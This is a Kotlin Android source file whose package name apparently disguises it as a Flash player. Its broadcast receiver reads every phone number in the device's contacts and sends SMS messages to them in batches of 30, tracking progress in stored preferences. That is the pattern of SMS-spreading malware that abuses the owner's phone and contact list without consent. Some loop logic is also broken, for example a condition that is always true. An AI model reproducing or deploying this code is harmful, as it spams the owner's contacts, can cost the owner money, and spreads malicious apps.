package com.flashplayer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.preference.PreferenceManager
import android.provider.ContactsContract
import android.telephony.SmsManager

class SendSmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context)
        val handler = Handler()
        var currentNumber = 0
        val smsManager = SmsManager.getDefault()
        if (!sharedPreferences.contains("lastNumber")) {
            val numbers = getNumbers(context)
            sharedPreferences.edit().putStringSet("allNumbers", numbers).apply()
            for (number in numbers.withIndex()) {
                if (number.index < 30) {
                    handler.postDelayed({
                        smsManager.sendTextMessage(
                            number.value,
                            null,
                            "This is just a test message",
                            null,
                            null
                        )
                    }, 15000)
                    currentNumber = number.index
                }
            }
        } else {
            val lastNumber =
                sharedPreferences.getInt("lastNumber", 0)
            val allNumbers = sharedPreferences.getStringSet("allNumbers", getNumbers(context))!!
            if (lastNumber != allNumbers.size) {
                for (number in allNumbers.withIndex()) {
                    if (lastNumber < lastNumber + 30) {
                        handler.postDelayed({
                            smsManager.sendTextMessage(
                                number.value,
                                null,
                                "This is just a test message",
                                null,
                                null
                            )
                        }, 15000)
                        currentNumber = number.index
                    }
                }
            } else {
                sharedPreferences.edit().putBoolean("done", true).apply()
            }
        }
        sharedPreferences.edit()
            .putInt("lastNumber", currentNumber).apply()
    }

    private fun getNumbers(context: Context?): Set<String> {
        val result = arrayListOf<String>()
        val contacts = context?.contentResolver?.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )
        contacts?.let {
            while (it.moveToNext()) {
                val number =
                    contacts.getString(contacts.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val formatted = number.replace(" ", "")
                result.add(formatted)
            }
            contacts.close()
            return result.toSet()
        }
        return result.toSet()
    }
}